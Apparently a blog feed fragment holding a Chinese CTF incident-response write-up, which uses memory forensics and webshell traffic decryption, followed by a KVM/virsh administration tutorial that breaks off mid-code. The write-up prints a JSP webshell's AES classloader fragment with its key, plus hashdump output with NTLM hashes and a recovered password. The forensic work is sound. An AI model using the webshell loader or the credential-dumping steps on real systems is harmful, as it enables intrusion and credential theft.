2024.2的版本，从U版开始就得用CentOS8部署了，具体原因没考究，大概率是因为内核的原因，本篇是S版本的教程，具体参考

组件选择
本文只装最基础的组件，Keystone、Glance、Placement、Nova、Neutron、Horizon

基础环境配置
网络环境配置
我这里采用两台主机构建基础的openstack，具体可参考文档： https://docs.openstack.org/install-guide/environment-networking-</summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Stein" scheme="https://blog.boychai.xyz/tags/Stein/"/>
    
    <category term="KVM" scheme="https://blog.boychai.xyz/tags/KVM/"/>
    
  </entry>
  
  <entry>
    <title>2024第一届Solar杯应急响应挑战赛-WriteUp</title>
    <link href="https://blog.boychai.xyz/2024/12/28/2024%E7%AC%AC%E4%B8%80%E5%B1%8ASolar%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/"/>
    <id>https://blog.boychai.xyz/2024/12/28/2024%E7%AC%AC%E4%B8%80%E5%B1%8ASolar%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/</id>
    <published>2024-12-28T18:00:00.000Z</published>
    <updated>2025-07-17T05:40:18.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CTF是数据库4-5、逆向破解-1、综合应急-2未解出，然后理论是Windows的应急响应,就拿到了300,这个成绩和排名真的是非常的可惜。最终成绩是49名拿到了一个优秀奖。<br><img src="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20241228165801.png" alt="成绩-1"><br><img src="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20241228165633.png" alt="成绩-2"><br><img src="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250103144907.png" alt="成绩-3"></p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>本题作为签到题,请给出邮服发件顺序。  </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])  </span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD  </span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800  </span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k  </span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=  </span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;  </span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec  </span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])  </span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264  </span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)  </span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800  </span><br><span class="line">To: hellosolartest@qq.com  </span><br><span class="line">From: 鍏嬪競缃戜俊  </span><br><span class="line">Subject:xxxxxxxxxx  </span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;  </span><br><span class="line">X-Mailer: QQMail 2.x</span><br></pre></td></tr></table></figure><p>把邮箱地址挨个拿出来即可<br>flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}</p><h1 id="日志流量-1"><a href="#日志流量-1" class="headerlink" title="日志流量-1"></a>日志流量-1</h1><p>题目文件：tomcat-wireshark.zip&#x2F;web<br>新手运维小王的Geoserver遭到了攻击：<br>黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。<br>flag格式 flag{xxxx}<br>流量分析中发现b.jsp的流量最大，而且都是加密内容，这里直接反编译一下发现flag，反编译这里需要反编译的路径是在<code>apache-tomcat-9.0.96\work\Catalina\localhost\ROOT\org\apache\jsp</code>,根目录给的那俩是不能用的。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228161147.png" alt="日志流量-1-1"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228161129.png" alt="日志流量-1-2"></p><h1 id="日志流量-2"><a href="#日志流量-2" class="headerlink" title="日志流量-2"></a>日志流量-2</h1><p>题目文件：tomcat-wireshark.zip&#x2F;web<br>新手运维小王的Geoserver遭到了攻击：<br>小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。<br>flag格式 flag{xxxx}<br>这段代码很清晰，是AES的加密，没指定加密模式应该是ECB,然后key是a2550eeab0724a69</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure><p>挨个分析到流6<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228105457.png" alt="日志流量-2-1"><br>他执行的对应命令是<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228105530.png" alt="日志流量-2-2"><br>拿到的返回内容是<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228105504.png" alt="日志流量-2-3"></p><h1 id="日志流量-3"><a href="#日志流量-3" class="headerlink" title="日志流量-3"></a>日志流量-3</h1><p>题目文件：tomcat-wireshark.zip&#x2F;web<br>新手运维小王的Geoserver遭到了攻击：<br>小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。<br>flag格式 flag{xxxx}<br>分析完2紧接着有个很大的流量，解密发现<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228105946.png" alt="日志流量-3-1"><br>他上传了一个pdf，我这里直接保存pdf然后改后缀打开拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228110008.png" alt="日志流量-3-2"></p><h1 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证-1"></a>内存取证-1</h1><p>题目文件：SERVER-2008-20241220-162057<br>请找到rdp连接的跳板地址<br>flag格式 flag{1.1.1.1}<br>RDP是远程桌面，端口一般都是3389，直接分析网络即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64 netscan |findstr 3389</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x7e300dc0         TCPv4    0.0.0.0:3389                   0.0.0.0:0            LISTENING        1908     svchost.exe</span><br><span class="line">0x7e303360         TCPv4    0.0.0.0:3389                   0.0.0.0:0            LISTENING        1908     svchost.exe</span><br><span class="line">0x7e303360         TCPv6    :::3389                        :::0                 LISTENING        1908     svchost.exe</span><br><span class="line">0x7decc010         TCPv4    192.168.60.150:3389            192.168.60.220:34121 ESTABLISHED      1908     svchost.exe</span><br></pre></td></tr></table></figure><p>flag{192.168.60.220}</p><h1 id="内存取证-2"><a href="#内存取证-2" class="headerlink" title="内存取证-2"></a>内存取证-2</h1><p>题目文件：SERVER-2008-20241220-162057<br>请找到攻击者下载黑客工具的IP地址<br>flag格式 flag{1.1.1.1}<br>我是通过网络的形式，通过下面命令拿到下面可疑信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan</span><br><span class="line">...</span><br><span class="line">0x7de65cf0         TCPv4    -:49263                        155.94.204.67:85     CLOSED           504</span><br><span class="line">0x7de89540         TCPv4    192.168.60.150:445             192.168.60.169:46087 CLOSED           4        System</span><br><span class="line">0x7dec4480         TCPv4    192.168.60.150:49261           34.117.188.166:443   ESTABLISHED      2068     firefox.exe</span><br><span class="line">0x7decc010         TCPv4    192.168.60.150:3389            192.168.60.220:34121 ESTABLISHED      1908     svchost.exe</span><br><span class="line">0x7ded2ba0         TCPv4    192.168.60.150:49185           34.107.243.93:443    ESTABLISHED      2068     firefox.exe</span><br><span class="line">0x7df56cf0         TCPv4    192.168.60.150:49257           192.168.60.169:4444  ESTABLISHED      828      spoolsv.exe</span><br><span class="line">0x7e6ef400         TCPv4    -:0                            168.148.77.26:0      CLOSED           48       N</span><br></pre></td></tr></table></figure><p>我去查询第一个的时候发现他是一个每过的ip，直接尝试提交，拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228113008.png" alt="内存取证-2-1"><br>flag{155.94.204.67}</p><h1 id="内存取证-3"><a href="#内存取证-3" class="headerlink" title="内存取证-3"></a>内存取证-3</h1><p>题目文件：SERVER-2008-20241220-162057<br>攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么<br>flag格式 flag{xxxx}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228132602.png" alt="内存取证-3-1"><br>在这里发现一个pass.txt，判断大概率在这里。这里直接导出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan |findstr pass.txt</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x000000007e4cedd0     16      0 R--rw- \Device\HarddiskVolume2\Users\Administrator\Desktop\pass.txt</span><br><span class="line">0x000000007e4ec900      2      0 RW-rw- \Device\HarddiskVolume2\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\pass.txt.lnk</span><br><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x7e4cedd0   None   \Device\HarddiskVolume2\Users\Administrator\Desktop\pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228132844.png" alt="内存出征-3-2"><br>flag{GalaxManager_2012}</p><h1 id="内存取证-4"><a href="#内存取证-4" class="headerlink" title="内存取证-4"></a>内存取证-4</h1><p>题目文件：SERVER-2008-20241220-162057<br>请找到攻击者创建的用户<br>flag格式 flag{xxxx}<br>直接列出所有用户，我尝试Testuser发现错误，Administrator和Guest是系统自带的，ASP.NET似乎是微软的一个后端框架，尝试这个成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Legend: (S) = Stable   (V) = Volatile</span><br><span class="line"></span><br><span class="line">----------------------------</span><br><span class="line">Registry: \SystemRoot\System32\Config\SAM</span><br><span class="line">Key name: Names (S)</span><br><span class="line">Last updated: 2024-12-20 16:14:42 UTC+0000</span><br><span class="line"></span><br><span class="line">Subkeys:</span><br><span class="line">  (S) Administrator</span><br><span class="line">  (S) ASP.NET</span><br><span class="line">  (S) Guest</span><br><span class="line">  (S) Testuser</span><br><span class="line"></span><br><span class="line">Values:</span><br><span class="line">REG_DWORD                     : (S) 0</span><br></pre></td></tr></table></figure><h1 id="内存取证-5"><a href="#内存取证-5" class="headerlink" title="内存取证-5"></a>内存取证-5</h1><p>题目文件：SERVER-2008-20241220-162057<br>请找到攻击者利用跳板rdp登录的时间<br>flag格式 flag{2024&#x2F;01&#x2F;01 00:00:00}</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64 pslist|findstr rdp</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0xfffffa801b046b30 rdpclip.exe            3896   1908      8      153      2      0 2024-12-20 16:15:34 UTC+0000</span><br><span class="line">E:\TEMP&gt;</span><br></pre></td></tr></table></figure><p>一直提交这个一直错误，一想他是UTC，尝试提交国内时区的即可成功<br><code>flag&#123;2024/12/21 00:15:34&#125;</code></p><h1 id="内存取证-6"><a href="#内存取证-6" class="headerlink" title="内存取证-6"></a>内存取证-6</h1><p>题目文件：SERVER-2008-20241220-162057<br>请找到攻击者创建的用户的密码哈希值<br>flag格式 flag{XXXX}<br>根据取证4直接看hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Legend: (S) = Stable   (V) = Volatile</span><br><span class="line"></span><br><span class="line">----------------------------</span><br><span class="line">Registry: \SystemRoot\System32\Config\SAM</span><br><span class="line">Key name: Names (S)</span><br><span class="line">Last updated: 2024-12-20 16:14:42 UTC+0000</span><br><span class="line"></span><br><span class="line">Subkeys:</span><br><span class="line">  (S) Administrator</span><br><span class="line">  (S) ASP.NET</span><br><span class="line">  (S) Guest</span><br><span class="line">  (S) Testuser</span><br><span class="line"></span><br><span class="line">Values:</span><br><span class="line">REG_DWORD                     : (S) 0</span><br><span class="line"></span><br><span class="line">E:\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Testuser:1000:aad3b435b51404eeaad3b435b51404ee:4bdcecfc666b002ea5aab1df8f08a9a2:::</span><br><span class="line">ASP.NET:1001:aad3b435b51404eeaad3b435b51404ee:5ffe97489cbec1e08d0c6339ec39416d:::</span><br></pre></td></tr></table></figure><p>flag{5ffe97489cbec1e08d0c6339ec39416d}</p><h1 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库-1"></a>数据库-1</h1><p>题目附件：mssql、mssql题-备份数据库<br>请找到攻击者创建隐藏账户的时间<br>flag格式 如 flag{2024&#x2F;01&#x2F;01 00:00:00}<br>虚机没提供密码，可以参考这篇<a href="https://blog.csdn.net/m0_73927535/article/details/140837327">文章</a>来直接进入虚机<br>通过动态取证的方式，进入虚拟机，在登陆的时候发现有个test$用户可以选择，一看就是个后门用户，这里通过命令拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228125352.png" alt="数据库-1-1"><br>flag{2024&#x2F;12&#x2F;16 15:24:21}</p><h1 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库-2"></a>数据库-2</h1><p>题目附件：mssql、mssql题-备份数据库<br>请找到恶意文件的名称<br>flag格式 如 flag{<em>.</em>}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228125523.png" alt="数据库-2-1"><br>一眼矿<br>flag{xmrig.exe}</p><h1 id="数据库-3"><a href="#数据库-3" class="headerlink" title="数据库-3"></a>数据库-3</h1><p>题目附件：mssql、mssql题-备份数据库<br>请找到恶意文件的外联地址<br>flag格式 如 flag{1.1.1.1}<br>火绒剑直接梭<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241228125909.png" alt="数据库-3-1"><br>flag{203.107.45.167}</p>]]></content>
    
    
    <summary type="html">前言
CTF是数据库4-5、逆向破解-1、综合应急-2未解出，然后理论是Windows的应急响应,就拿到了300,这个成绩和排名真的是非常的可惜。最终成绩是49名拿到了一个优秀奖。




签到
本题作为签到题,请给出邮服发件顺序。 

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16


Received: from mail.da4s8gag.com ([140.143.207.229])  
by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD  
for ; Thu, 17 Oct 2024 11:24:</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/tags/WriteUp/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="CRYPTO" scheme="https://blog.boychai.xyz/tags/CRYPTO/"/>
    
    <category term="Forensics" scheme="https://blog.boychai.xyz/tags/Forensics/"/>
    
  </entry>
  
  <entry>
    <title>KVM-虚拟机管理</title>
    <link href="https://blog.boychai.xyz/2024/12/27/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86/"/>
    <id>https://blog.boychai.xyz/2024/12/27/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86/</id>
    <published>2024-12-27T18:23:00.000Z</published>
    <updated>2025-07-17T05:40:18.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于虚拟化技术"><a href="#关于虚拟化技术" class="headerlink" title="关于虚拟化技术"></a>关于虚拟化技术</h1><p>虚拟化是一种通过模拟计算机硬件，使一台计算机可以同时运行多个不同操作系统的技术。虚拟化极大地提高了硬件资源的利用率，同时降低了物理设备的成本和管理复杂性。</p><h1 id="虚拟化软件的差别"><a href="#虚拟化软件的差别" class="headerlink" title="虚拟化软件的差别"></a>虚拟化软件的差别</h1><p>qume 全虚拟化软件，特别慢但是兼容性特别好。<br>xen     半虚拟化软件，需要使用专门修改之后的内核，性能很高，兼容性很差。redhat在5.5的版本将xen替换成kvm<br>kvm    全虚拟化软件，它具有硬件支持cpu，内置在linux内核模块中，不需要使用专门的内核。性能好，兼容性好。<br>kvm的兼容性没有qume好，但是他比qume的性能好太多了<br>kvm的性能没有xen好，但是他比xen的兼容性好太多了</p><h1 id="安装KVM"><a href="#安装KVM" class="headerlink" title="安装KVM"></a>安装KVM</h1><p>KVM全称：Kernel-based Virtual Machine<br>libvirt：因为KVM是基于内核的，linux用户是没办法直接操作内核的，这个软件包就是一个操作的工具。<br>virt-install：安装虚拟机用的。<br>qume-kvm：kvm是没有自己的虚拟磁盘技术的，所以直接兼容了qume的虚拟磁盘，这个包即兼容并优化了qume的磁盘。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install libvirt virt-install qemu-kvm -y</span><br><span class="line">systemctl <span class="built_in">enable</span> --now libvirtd</span><br></pre></td></tr></table></figure><h1 id="虚机管理"><a href="#虚机管理" class="headerlink" title="虚机管理"></a>虚机管理</h1><h2 id="创建一个虚拟机"><a href="#创建一个虚拟机" class="headerlink" title="创建一个虚拟机"></a>创建一个虚拟机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@template ~]# virt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole</span><br><span class="line">Starting install...</span><br><span class="line">Allocating <span class="string">&#x27;centos.raw&#x27;</span>                   |  10 GB  00:00:00</span><br><span class="line">Domain installation still <span class="keyword">in</span> progress. You can reconnect to</span><br><span class="line">the console to complete the installation process.</span><br></pre></td></tr></table></figure><p>要注意的是–cdrom参数，镜像不要放在root目录下会报权限相关的问题，建议丢到一个公共的位置，例如&#x2F;opt下，然后操控的用户和用户组都是qemu<br>创建好之后可以通过vnc来连接，这里设置离连接方式是vnc，并且监听的位置是0.0.0.0<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241226152259.png" alt="VNC"></p><h2 id="管理命令"><a href="#管理命令" class="headerlink" title="管理命令"></a>管理命令</h2><p>主要使用<code>virsh</code>来管理KVM虚拟机</p><h2 id="列出虚机"><a href="#列出虚机" class="headerlink" title="列出虚机"></a>列出虚机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh list</span><br></pre></td></tr></table></figure><p>这条命令默认是列出所有运行的虚机，如果虚机在关闭状态则不会列出，想要列出所有状态的虚机需要添加<code>--all</code>参数</p><h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh shutdown 虚机名</span><br></pre></td></tr></table></figure><p>关机的话系统必须装好，否则没用</p><h2 id="开机"><a href="#开机" class="headerlink" title="开机"></a>开机</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh start 虚机名</span><br></pre></td></tr></table></figure><h2 id="强制关机"><a href="#强制关机" class="headerlink" title="强制关机"></a>强制关机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh destroy 虚机名</span><br></pre></td></tr></table></figure><p>这相当于拔掉虚机的电源</p><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh reboot 虚机名</span><br></pre></td></tr></table></figure><p>重启的话系统必须装好，否则没用</p><h2 id="导出配置"><a href="#导出配置" class="headerlink" title="导出配置"></a>导出配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh dumpxml 虚机名</span><br></pre></td></tr></table></figure><p>导出对应虚机的配置文件</p><h2 id="取消定义"><a href="#取消定义" class="headerlink" title="取消定义"></a>取消定义</h2><p>这里是把对应的虚拟机移除kvm的管理里，相当于从kvm中删除，配置文件也会被删除，但是实际的镜像文件还是会保留。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh undefine 虚机名</span><br></pre></td></tr></table></figure><h2 id="导入配置"><a href="#导入配置" class="headerlink" title="导入配置"></a>导入配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh define xml配置文件</span><br></pre></td></tr></table></figure><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh edit 虚机名</span><br></pre></td></tr></table></figure><h2 id="挂起"><a href="#挂起" class="headerlink" title="挂起"></a>挂起</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh <span class="built_in">suspend</span> 虚机名</span><br></pre></td></tr></table></figure><p>锁定当前状态</p><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh resume 虚机名</span><br></pre></td></tr></table></figure><h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh autostart 虚机名</span><br></pre></td></tr></table></figure><p>可以添加参数<code>--disable</code>来取消开机自启</p><h2 id="列出所有开机自启主机"><a href="#列出所有开机自启主机" class="headerlink" title="列出所有开机自启主机"></a>列出所有开机自启主机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh list --autostart --all</span><br></pre></td></tr></table></figure><p>不加参数<code>--all</code>参数的话，只会列出开机的主机。</p><h2 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh console 虚机名</span><br></pre></td></tr></table></figure><p>想要通过<code>console</code>直接连接控制虚机，需要提前在虚拟机中执行下面命令让其支持(执行完请重启虚机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grubby --update-kernel=ALL --args=<span class="string">&quot;console=ttyS0,115200n8&quot;</span></span><br></pre></td></tr></table></figure><h1 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h1><h2 id="关于磁盘格式"><a href="#关于磁盘格式" class="headerlink" title="关于磁盘格式"></a>关于磁盘格式</h2><ul><li>RAW：原始格式，也叫野格式，不支持快照功能，不方便传输，读写性能较好。</li><li>qcow2：qcow2(copy on write)写时复制(动态占用空间)，占用空间小，支持快照，性能比raw差一点，方便传输。</li></ul><h2 id="管理命令-1"><a href="#管理命令-1" class="headerlink" title="管理命令"></a>管理命令</h2><p>主要使用<code>qemu-img</code>来管理KVM虚拟机</p><h2 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img info 虚拟磁盘</span><br></pre></td></tr></table></figure><h2 id="创建磁盘"><a href="#创建磁盘" class="headerlink" title="创建磁盘"></a>创建磁盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 位置 大小</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 /opt/test.qcow2 1G</span><br></pre></td></tr></table></figure><p>在<code>/opt/test.qcow2</code>位置创建一个1G大小的磁盘</p><h2 id="调整容量"><a href="#调整容量" class="headerlink" title="调整容量"></a>调整容量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 